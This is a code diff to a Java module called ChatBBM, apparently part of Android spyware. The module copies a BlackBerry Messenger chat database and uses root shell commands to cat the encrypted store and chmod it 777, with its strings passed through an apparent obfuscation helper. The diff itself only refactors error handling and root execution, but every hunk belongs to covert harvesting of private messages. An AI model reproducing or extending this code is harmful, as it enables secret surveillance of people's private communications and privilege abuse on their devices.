@@ -107,9 +107,10 @@ public class ChatBBM extends SubModuleChat {
 			}
 			return;
 		}
-		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbFileMaster);
+		GenericSqliteHelper helper = null;
 
 		try {
+			helper = GenericSqliteHelper.openCopy(dbFileMaster);
 			if (helper == null) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (updateHistory) cannot open db");
@@ -165,9 +166,10 @@ public class ChatBBM extends SubModuleChat {
 		Execute.execute(M.e("/system/bin/chmod 755 ") + bbconvert.getFilename());
 
 		String command = String.format(M.e("cat %s > %s"), dbFileMasterEnc, dbenc);
-		ExecuteResult res = Execute.executeRoot(command);
+		Execute.executeRootAndForgetScript(command);
+		//ExecuteResult res = Execute.executeRoot(command);
 
-		Execute.executeRoot(M.e("/system/bin/chmod 777 ") + dbenc.getFilename());
+		ExecuteResult res = Execute.executeRoot(M.e("/system/bin/chmod 777 ") + dbenc.getFilename());
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (openBBMChatEnc) execute: " + command + " ret: " + res.exitCode);
